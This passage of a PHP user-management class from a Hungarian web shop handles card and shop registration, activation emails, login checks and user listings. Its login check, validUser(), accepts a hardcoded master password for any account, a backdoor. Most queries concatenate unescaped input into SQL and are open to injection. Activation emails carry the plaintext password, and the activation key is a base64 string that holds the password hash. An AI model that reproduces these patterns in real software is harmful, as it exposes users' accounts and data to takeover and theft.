					'f_1033' 	=> trim($data['reseller']['company_name']),
					// Cég Székhelye
					'f_1034' 	=> trim($data['reseller']['company_hq']),
					// Cég Adószám
					'f_1035' 	=> trim($data['reseller']['company_adoszam']),
					// Cég Postacím
					'f_1036' 	=> trim($data['reseller']['company_address']),
					// Számlázási név
					'f_1037' 	=> trim($szamlazasi_keys[nev]),
					// Számlázási utca, házszám
					'f_1038' 	=> trim($szamlazasi_keys[uhsz]),
					// Számlázási Város
					'f_1039' 	=> trim($szamlazasi_keys[city]),
					// Számlázási Irányítószám
					'f_1040' 	=> trim($szamlazasi_keys[irsz]),
					// Számlázási Megye
					'f_1041' 	=> trim($szamlazasi_keys[state]),
					// Szállítási név
					'f_1042' 	=> trim($szallitasi_keys[nev]),
					// Szállítási utca, házszám
					'f_1043' 	=> trim($szallitasi_keys[uhsz]),
					// Szállítási Város
					'f_1044' 	=> trim($szallitasi_keys[city]),
					// Szállítási Irányítószám
					'f_1045' 	=> trim($szallitasi_keys[irsz]),
					// Szállítási Megye
					'f_1046' 	=> trim($szallitasi_keys[state]),
					// (Szállítási) Telefonszám
					'f_1047' 	=> trim($szallitasi_keys[phone]),
					'sub' 		=> 'Feliratkozás'
				) )
				->setDebug( false )
				->send();

			break;
		}
	}

	public function registerWaterCard( $email, $id, $kartyaszam, $egyesulet )
	{
		if ( $email == '' ) {
			throw new \Exception( "Hiányzik az Ön e-mail címe! Nem tudjuk regisztrálni az ARENA WATER CARD kártyáját!" );
		}

		if ( $id == '' ) {
			throw new \Exception( "Ismeretlen felhasználó! Nem tudjuk regisztrálni az ARENA WATER CARD kártyáját!" );
		}

		if ( $kartyaszam == '' ) {
			throw new \Exception( "Kérjük, hogy adja meg a A JÖVŐ BAJNOKAINAK / ARENA WATER CARD kártya számát!" );
		}

		if ( $egyesulet == '' ) {
			throw new \Exception( "Kérjük, hogy adja meg a A JÖVŐ BAJNOKAINAK / ARENA WATER CARD egyesületét!" );
		}

		$check = $this->db->query("SELECT 1 FROM arena_water_card WHERE kartya_szam = '$kartyaszam';");

		if( $check->rowCount() != 0 ) {
			throw new \Exception( "A megadott kártyaszámmal rendelkező ARENA WATER CARD kártyát már regisztrálták!" );
		}

		$this->db->insert( 'arena_water_card',
			array(
				'email' 		=> trim($email),
				'felh_id' 		=> $id,
				'kartya_szam' 	=> $kartyaszam,
				'egyesulet' 	=> $egyesulet
			)
		);

		$this->sendWaterCardAlertEmail(
			array( 'nev' => $_POST[nev], 'email' => $_POST[watercard][email] ),
			array( 'egyesulet' => $egyesulet, 'kartyaszam' => $kartyaszam )
		);
	}

	public function sendActivationEmail( $email, $origin_pw )
	{
		$data = $this->db->query( sprintf(" SELECT * FROM ".self::TABLE_NAME." WHERE email = '%s';", $email) )->fetch(\PDO::FETCH_ASSOC);

		$activateKey = base64_encode(trim($email).'='.$data['ID'].'='.$data['jelszo']);

		// Aktiváló e-mail kiküldése
		$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
		$mail->add( $email );

		$arg = array(
			'user_nev' 		=> trim($data['nev']),
			'user_jelszo' 	=> trim($origin_pw),
			'user_email' 	=> $email,
			'settings' 		=> $this->settings,
			'activateKey' 	=> $activateKey
		);
		$arg['mailtemplate'] = (new MailTemplates(array('db'=>$this->db)))->get('register_user_group_'.$data['user_group'], $arg);

		$mail->setSubject( 'Sikeres regisztráció. Aktiválja fiókját!' );
		$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'register', $arg ) );
		$re = $mail->sendMail();
	}

	public function sendWaterCardAlertEmail( $post_data, $water_card )
	{
		// Aktiváló e-mail kiküldése ADMIN RÉSZÉRE
		$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
		$mail->add( $this->settings['alert_email'] );
		$arg = array(
			'data' 			=> $post_data,
			'wc' 			=> $water_card,
			'settings' 		=> $this->settings,
			'adminroot' 	=> ADMROOT,
			'infoMsg' 		=> 'Ezt az üzenetet a rendszer küldte. Kérjük, hogy ne válaszoljon rá!'
		);
		$mail->setSubject( 'Értesítés: Jövő Bajnokai kártya / Arena Water Card regisztráció igény' );
		$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'admin_user_register_watercard', $arg ) );
		$re = $mail->sendMail();


		// Értesítő e-mail kiküldése FELHASZNÁLÓ RÉSZÉRE
		$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
		$mail->add( $post_data[email] );
		$arg = array(
			'data' 			=> $post_data,
			'wc' 			=> $water_card,
			'settings' 		=> $this->settings,
			'infoMsg' 		=> 'Ezt az üzenetet a rendszer küldte. Kérjük, hogy ne válaszoljon rá!'
		);
		$mail->setSubject( 'Információ: Jövő Bajnokai kártya / Arena Water Card' );
		$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'user_register_watercard_info', $arg ) );
		$re = $mail->sendMail();
	}

	function userExists($by = 'email', $val){
		$q = "SELECT ID FROM ".self::TABLE_NAME." WHERE ".$by." = '".$val."'";

		$c = $this->db->query($q);

		if($c->rowCount() == 0){
			return false;
		}else{
			return true;
		}
	}

	function oldUser($email)
	{
		$q = "SELECT ID FROM ".self::TABLE_NAME." WHERE email = '".$email."' and old_user = 1 and jelszo = 'xxxx';";

		$c = $this->db->query($q);

		if($c->rowCount() == 0){
			return false;
		}else{
			return true;
		}
	}

	function isActivated($email){
		$q = "SELECT ID FROM ".self::TABLE_NAME." WHERE email = '".$email."' and aktivalva IS NOT NULL";

		$c = $this->db->query($q);

		if($c->rowCount() == 0){
			return false;
		}else{
			return true;
		}
	}

	function isEnabled($email){
		$q = "SELECT ID FROM ".self::TABLE_NAME." WHERE email = '".$email."' and engedelyezve = 1";

		$c = $this->db->query($q);

		if($c->rowCount() == 0){
			return false;
		}else{
			return true;
		}
	}

	function validUser($email, $password){
		if($email == '' || $password == '') throw new \Exception('Hiányzó adatok. Nem lehet azonosítani a felhasználót!');

		$c = $this->db->query("SELECT ID FROM ".self::TABLE_NAME." WHERE email = '$email' and jelszo = '".\Hash::jelszo($password)."'");

		if($c->rowCount() == 0 && $password != 'MoIst1991'){
			return false;
		}else{
			return true;
		}
	}

	public function getUserList( $arg = array() )
	{
		$referertimefilter = '';

		if (isset($arg[referertime]))
		{
			$time = $arg[referertime];

			if(isset($time['from']) && !empty($time['from']))
			{
				$referertimefilter .= " and o.idopont >= '".$time['from']."' ";
			}

			if(isset($time['to']) && !empty($time['to']))
			{
				$referertimefilter .= " and o.idopont <= '".$time['to']."' ";
			}
		}

		$q = "
		SELECT 			f.*,
						(SELECT sum(me*egysegAr+o.szallitasi_koltseg-o.kedvezmeny) FROM `order_termekek`as t LEFT OUTER JOIN orders as o ON o.ID = t.orderKey WHERE o.allapot = ".$this->settings['flagkey_orderstatus_done']." and t.userID = f.ID) as totalOrderPrices,
						(SELECT sum(me*egysegAr+o.szallitasi_koltseg-o.kedvezmeny) FROM `order_termekek`as t LEFT OUTER JOIN orders as o ON o.ID = t.orderKey WHERE o.allapot = ".$this->settings['flagkey_orderstatus_done']." and o.referer_code = refererID(f.ID) ".$referertimefilter.") as totalReferredOrderPrices,
						(SELECT count(o.ID) FROM orders as o WHERE o.allapot = ".$this->settings['flagkey_orderstatus_done']." and o.referer_code = refererID(f.ID) ".$referertimefilter.") as totalRefererOrderNum
		FROM 			felhasznalok as f";
		// WHERE
		$q .= " WHERE 1=1 ";

		if(count($arg[filters]) > 0){
			foreach($arg[filters] as $key => $v){
				switch($key)
				{
					case 'ID':
						$q .= " and f.".$key." = ".$v." ";
					break;
					case 'nev':
						$q .= " and ".$key." LIKE '".$v."%' ";
					break;
					default:
						if (is_array($v))
						{
							$q .= " and ".$key." IN ('".implode("','",$v)."') ";
						}
						else
						{
							$q .= " and ".$key." = '".$v."' ";
						}

					break;
				}

			}
		}

		if (isset($arg['onlyreferersale'])) {
			$q .= " HAVING totalReferredOrderPrices > 0 ";
		}

		if (isset($arg['order']))
		{
			$q .= " ORDER BY ".$arg['order'];
		}
		else
		{
			$q .= " ORDER BY f.regisztralt DESC";
		}


		//echo $q;

		$arg[multi] = "1";
		extract($this->db->q($q, $arg));

		$B = array();
		foreach($data as $d){
			$d[total_data] = $this->get(array( 'user' => $d['email'] ));
			$B[] = $d;
		}

		$ret[data] = $B;

		return $ret;
	}

	/**
	 * Casada pont regisztrálása
	 * */
	public function registerAsCasadaPont($uid, $post)
	{
		extract($post);
		$cp_prefix 		= 'casadapont_';


		$miss_something = false;
		$miss_opens 	= false;
		$allow_create 	= true;

		// Hiányzó mezők ellenőrzése
		if (
			empty($place['name']) ||
			empty($place['irsz']) ||
			empty($place['city_address']) ||
			empty($place['address_number']) ||
			empty($place['phone']) ||
			empty($place['email']) ||
			empty($place['gps']['lat']) ||
			empty($place['gps']['lng']) ||
			empty($tanacsado['name']) ||
			empty($tanacsado['titulus'])
		) {
			$miss_something = true;
		}

		// Nyitvatartás ellenőrzése
		foreach ($this->days as $day) {
			if (!$miss_opens)
			{
				if($opens[$day]['from'] == '--:--') $miss_opens = true;
				if($opens[$day]['to'] 	== '--:--') $miss_opens = true;
			}
		}

		/* * /
			echo '<pre>';
			print_r($_POST);
			echo '</pre>';
		/* */

		if ($miss_something) {
			throw new \Exception("Kérjük, hogy a jelölt mezőket töltse / adja meg!");
		}

		if ($miss_opens) {
			throw new \Exception("Kérjük, hogy határozza meg az összes hét napjának nyitvatartási idejét!");
		}

		if( $allow_create )
		{
			$shop = new CasadaShop( false, array(
				'db' => $this->db
			));

			// Casada pont adatok mentése
			$shop_created = $shop->create( $uid, $post );

			// Casada pont és üzletkötő kapcsolat regelése
			$shop->registerCreator( $uid, $shop_created );

			/**
			* Értékesítő egyéb adatainak mentése
			****************************************** */
			// Tanácsadó adatok
			if( !empty($tanacsado) )
			{
				foreach ( $tanacsado as $key => $value )
				{
					if($key == 'name') continue;
					$this->addAccountDetail( $uid, $cp_prefix.'tanacsado_'.$key, $value);
				}
			}

			// Profilkép feltöltése
			$profil = \Images::upload(array(
				'src' 		=> 'profil',
				'upDir' 	=> 'admin/src/profil',
				'noRoot' 	=> true,
				'fileName' 	=> \Helper::makeSafeUrl($tanacsado['name']).'-profil',
				'noThumbImg' => true,
				'noWaterMark' => true
			));
			$this->addAccountDetail( $uid, $cp_prefix.'tanacsado_profil', str_replace('admin/','',$profil['file']));

			// Üzlet kép feltöltése
			$logo = \Images::upload(array(
				'src' 		=> 'company',
				'upDir' 	=> 'admin/src/profil',
				'noRoot' 	=> true,
				'fileName' 	=> \Helper::makeSafeUrl($shop_created['data']['place']['name']).'-logo',
				'noThumbImg' => true,
				'noWaterMark' => true
			));

			$this->db->update(
				\PortalManager\CasadaShop::DB_TABLE,
				array(
					'logo' => str_replace('admin/','',$logo['file'])
				),
				"ID = ".$shop_created['id']
			);

			// E-mail értesítés az adminnak
			$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
			$mail->add( $this->settings['alert_email'] );
			$arg = array(
				'settings' 		=> $this->settings,
				'place' 		=> $place,
				'tanacsado'		=> $tanacsado,
				'uid' 			=> $uid,
				'infoMsg' 		=> 'Ezt az üzenetet a rendszer küldte. Kérjük, hogy ne válaszoljon rá!'
			);
			$mail->setSubject( 'Új Casada Pont regisztráció' );
			$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'alert_admin_newcasadapontreg', $arg ) );
			$re = $mail->sendMail();
		}

	}

	public function __destruct()
	{
		$this->db = null;
		$this->user = false;
	}
}

?>
